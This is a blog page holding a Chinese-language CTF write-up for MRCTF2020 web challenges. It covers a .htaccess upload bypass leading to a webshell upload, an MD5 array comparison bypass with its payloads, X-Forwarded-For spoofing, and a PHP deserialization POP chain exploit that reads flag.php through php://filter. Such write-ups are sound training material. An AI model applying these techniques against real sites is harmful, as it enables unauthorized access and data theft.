<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author"><title>writeup Â· Mashiroã®å°ç«™</title><meta name="description" content="[MRCTF2020] ä½ ä¼ ä½ ğŸå‘¢#çŸ¥è¯†ç‚¹#
.htaccessä¸Šä¼ ç»•è¿‡

è§£é¢˜#ä¼ .htaccesså‘ç°ä¸å¤ªè¡Œï¼Œburpä¿®æ”¹Content-Typeä¸ºImage/jpegæˆåŠŸä¸Šä¼ ï¼Œå†ä¸Šä¼ ä¸€å¼ jpgé©¬å°±èƒ½ç›´æ¥è¿ä¸Šäº†
[MRCTF2020] Ez_bypass#çŸ¥è¯†ç‚¹#
md5æ¯”è¾ƒæ¼æ´
æ•°å­—æˆªå–

"><meta name="keywords" content=""><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/bootstrap.min.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/style-dark.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 5.1.1"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div id="stage" class="container"><div class="row"><div id="side-bar" class="col-sm-3 col-xs-12 side-container invisible"><div class="vertical-text site-title"><h3 tabindex="-1" class="site-title-small"><a href="/" class="a-title">Typography</a></h3><h1 tabindex="-1" class="site-title-large"><a href="/" class="a-title">Sakamoto</a></h1><!--h6(onclick="triggerSiteNav()") Trigger--></div><br class="visible-lg visible-md visible-sm"><div id="site-nav" class="site-title-links"><ul><li><a href="/">é¦–é¡µ</a></li><li><a href="/archives">å½’æ¡£</a></li><li><a href="/categories">åˆ†ç±»</a></li><li><a href="/tags">æ ‡ç­¾</a></li><li><a href="/categories/index.html">categories</a></li><li><a href="/leetcode/index.html">leetcode</a></li><li><a href="/tags/index.html">tags</a></li><li><a href="/writeup/SUCTF_2018.html">writeup</a></li><li><a href="/writeup/SUCTF_2019.html">writeup</a></li><li><a href="/writeup/index.html" class="current">writeup</a></li><li><a href="/writeup/MRCTF_2020.html" class="current">writeup</a></li><li class="soc"><a href="https://github.com/mashiro01" target="_blank" rel="noopener noreferrer"><i class="fa fa-github">&nbsp;</i></a><a href="https://mashiro01.github.io/atom.xml" target="_blank" rel="noopener noreferrer"><i class="fa fa-rss">&nbsp;</i></a></li></ul><div class="visible-lg visible-md visible-sm site-nav-footer"><br class="site-nav-footer-br"><footer><p>&copy;&nbsp;2020&nbsp;<a target="_blank" href="https://mashiro01.github.io" rel="noopener noreferrer">Mashiroi</a></p><p>Theme&nbsp;<a target="_blank" href="https://github.com/SumiMakito/hexo-theme-typography" rel="noopener noreferrer">Typography</a>&nbsp;by&nbsp;<a target="_blank" href="https://www.keep.moe" rel="noopener noreferrer">Makito</a></p><p>Proudly published with&nbsp;<a target="_blank" href="https://hexo.io" rel="noopener noreferrer">Hexo</a></p></footer></div></div></div><div id="main-container" class="col-sm-9 col-xs-12 main-container invisible"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post-container"><p class="post-title"><a>writeup</a></p><p class="post-meta"><span class="date meta-item">å‘å¸ƒäº&nbsp;2020-09-05</span><span class="meta-item"><i class="fa fa-comment-o"></i><span>&nbsp;</span><a href="/writeup/MRCTF_2020.html#comments">è¯„è®º</a></span></p><p class="post-abstract"><h2><span id="mrctf2020-ni-chuan-ni-ni">[MRCTF2020] ä½ ä¼ ä½ ğŸå‘¢</span><a href="#mrctf2020-ni-chuan-ni-ni" class="header-anchor">#</a></h2><h3><span id="zhi-shi-dian">çŸ¥è¯†ç‚¹</span><a href="#zhi-shi-dian" class="header-anchor">#</a></h3><ol>
<li>.htaccessä¸Šä¼ ç»•è¿‡</li>
</ol>
<h3><span id="jie-ti">è§£é¢˜</span><a href="#jie-ti" class="header-anchor">#</a></h3><p>ä¼ <code>.htaccess</code>å‘ç°ä¸å¤ªè¡Œï¼Œburpä¿®æ”¹<code>Content-Type</code>ä¸º<code>Image/jpeg</code>æˆåŠŸä¸Šä¼ ï¼Œå†ä¸Šä¼ ä¸€å¼ jpgé©¬å°±èƒ½ç›´æ¥è¿ä¸Šäº†</p>
<h2><span id="mrctf2020-ez-bypass">[MRCTF2020] Ez_bypass</span><a href="#mrctf2020-ez-bypass" class="header-anchor">#</a></h2><h3><span id="zhi-shi-dian">çŸ¥è¯†ç‚¹</span><a href="#zhi-shi-dian" class="header-anchor">#</a></h3><ol>
<li>md5æ¯”è¾ƒæ¼æ´</li>
<li>æ•°å­—æˆªå–</li>
</ol>
<h3><span id="jie-ti">è§£é¢˜</span><a href="#jie-ti" class="header-anchor">#</a></h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">include &#39;flag.php&#39;;
$flag&#x3D;&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;
if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;
    $id&#x3D;$_GET[&#39;id&#39;];
    $gg&#x3D;$_GET[&#39;gg&#39;];
    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123;
        echo &#39;You got the first step&#39;;
        if(isset($_POST[&#39;passwd&#39;])) &#123;
            $passwd&#x3D;$_POST[&#39;passwd&#39;];
            if (!is_numeric($passwd))
            &#123;
                 if($passwd&#x3D;&#x3D;1234567)
                 &#123;
                     echo &#39;Good Job!&#39;;
                     highlight_file(&#39;flag.php&#39;);
                     die(&#39;By Retr_0&#39;);
                 &#125;
                 else
                 &#123;
                     echo &quot;can you think twice??&quot;;
                 &#125;
            &#125;
            else&#123;
                echo &#39;You can not get it !&#39;;
            &#125;

        &#125;
        else&#123;
            die(&#39;only one way to get the flag&#39;);
        &#125;
&#125;
    else &#123;
        echo &quot;You are not a real hacker!&quot;;
    &#125;
&#125;
else&#123;
    die(&#39;Please input first&#39;);
&#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>if (md5($id) === md5($gg) &amp;&amp; $id !== $gg)<br>GET: id[]=1&amp;gg[]=2</p>
<p>passwd -&gt; is_numeric -&gt; ==1234567<br>POST: passwd=123456a</p>
</blockquote>
<h2><span id="mrctf2020-pywebsite">[MRCTF2020] PYWebsite</span><a href="#mrctf2020-pywebsite" class="header-anchor">#</a></h2><h3><span id="jie-ti">è§£é¢˜</span><a href="#jie-ti" class="header-anchor">#</a></h3><p>ç›´æ¥çœ‹æºç ï¼Œè®¿é—®flag.phpï¼Œçœ‹åˆ°è¿™å¥è¯</p>
<blockquote>
<p>éªŒè¯é€»è¾‘æ˜¯åœ¨åç«¯çš„ï¼Œé™¤äº†è´­ä¹°è€…å’Œæˆ‘è‡ªå·±ï¼Œæ²¡æœ‰äººå¯ä»¥çœ‹åˆ°flag</p>
</blockquote>
<p>æ˜¾ç„¶ç›´æ¥æŠŠ<code>X-Forwarded-For</code>æ”¹æˆ<code>127.0.0.1</code>å°±è¡Œäº†</p>
<h2><span id="ezpop">Ezpop</span><a href="#ezpop" class="header-anchor">#</a></h2><h3><span id="jie-ti">è§£é¢˜</span><a href="#jie-ti" class="header-anchor">#</a></h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
&#x2F;&#x2F;flag is in flag.php
&#x2F;&#x2F;WTF IS THIS?
&#x2F;&#x2F;Learn From https:&#x2F;&#x2F;ctf.ieki.xyz&#x2F;library&#x2F;php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
&#x2F;&#x2F;And Crack It!
class Modifier &#123;
    protected  $var;
    public function append($value)&#123;
        include($value);
    &#125;
    public function __invoke()&#123;
        $this-&gt;append($this-&gt;var);
    &#125;
&#125;

class Show&#123;
    public $source;
    public $str;
    public function __construct($file&#x3D;&#39;index.php&#39;)&#123;
        $this-&gt;source &#x3D; $file;
        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;
    &#125;
    public function __toString()&#123;
        return $this-&gt;str-&gt;source;
    &#125;

    public function __wakeup()&#123;
        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;
            echo &quot;hacker&quot;;
            $this-&gt;source &#x3D; &quot;index.php&quot;;
        &#125;
    &#125;
&#125;

class Test&#123;
    public $p;
    public function __construct()&#123;
        $this-&gt;p &#x3D; array();
    &#125;

    public function __get($key)&#123;
        $function &#x3D; $this-&gt;p;
        return $function();
    &#125;
&#125;

if(isset($_GET[&#39;pop&#39;]))&#123;
    @unserialize($_GET[&#39;pop&#39;]);
&#125;
else&#123;
    $a&#x3D;new Show;
    highlight_file(__FILE__);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å…ˆåˆ†æä¸‹çº¿ç´¢</p>
<ol>
<li>Modifierç±»ä¸­æœ‰<code>__invoke</code>æ–¹æ³•ï¼Œå¯ä»¥å°è¯•ç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨è¿™ä¸ªç±»æ¥è§¦å‘</li>
<li>Showä¸­æœ‰ä¸€ä¸ª<code>__toString</code>ï¼Œå†çœ‹åˆ°__constructæ–¹æ³•ä¸­èƒ½ç”¨<code>echo</code>è°ƒç”¨<code>$this -&gt; source</code>ï¼Œå¯ä»¥ç¡®å®šç”¨è‡ªèº«è°ƒç”¨è‡ªèº«æ¥è§¦å‘è¿™ä¸ªæ–¹æ³•</li>
<li>Testä¸­æœ‰<code>__get</code>ï¼Œå†åŠ ä¸ŠModifierä¸­æœ‰ä¸€ä¸ªprotectedå±æ€§çš„å˜é‡ï¼Œç¡®å®šç”¨è¿™ä¸ªæ–¹æ³•æ¥è®¿é—®<code>$var</code></li>
<li>includeèƒ½å¤Ÿç”¨ä¼ªåè®®çš„æ–¹å¼æ¥è¯»å–æ–‡ä»¶</li>
</ol>
<p>æ€»ç»“ä»¥ä¸Šï¼Œå†™å‡ºè°ƒç”¨é“¾</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
class Modifier &#123;
  protected  $var &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;
&#125;

class Show&#123;
  public $source;
  public $str;
  public function __construct($file&#x3D;&#39;index.php&#39;)&#123;
      $this-&gt;source &#x3D; $file;
  &#125;
  public function __toString()&#123;
      return $this-&gt;str-&gt;source;
  &#125;
&#125;

class Test&#123;
  public $p;
&#125;

$a &#x3D; new Show(&quot;test&quot;);
$a -&gt; str &#x3D; new Test();
$a -&gt; str -&gt; p &#x3D; new Modifier();
$b &#x3D; new Show($a);

echo urlencode(serialize($b));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</p></div><a id="comments"></a><div id="disqus_thread"></div><script>var disqus_shortname = 'mashiro01';
var disqus_identifier = 'writeup/MRCTF_2020.html';
var disqus_title = 'writeup';
var disqus_url = 'https://mashiro01.github.io/writeup/MRCTF_2020.html';
(function () {
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();</script><script id="dsq-count-scr" src="//mashiro01.disqus.com/count.js" async></script></div></div></div><div class="visible-xs site-bottom-footer"><footer><p>&copy;&nbsp;2020&nbsp;<a target="_blank" href="https://mashiro01.github.io" rel="noopener noreferrer">Mashiroi</a></p><p>Theme&nbsp;<a target="_blank" href="https://github.com/SumiMakito/hexo-theme-typography" rel="noopener noreferrer">Typography</a>&nbsp;by&nbsp;<a target="_blank" href="https://www.keep.moe" rel="noopener noreferrer">Makito</a></p><p>Proudly published with&nbsp;<a target="_blank" href="https://hexo.io" rel="noopener noreferrer">Hexo</a></p></footer></div></div></div></div><script src="/js/jquery-3.1.0.min.js"></script><script src="/js/bootstrap.min.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/google-analytics.js"></script><script src="/js/typography.js"></script></body></html>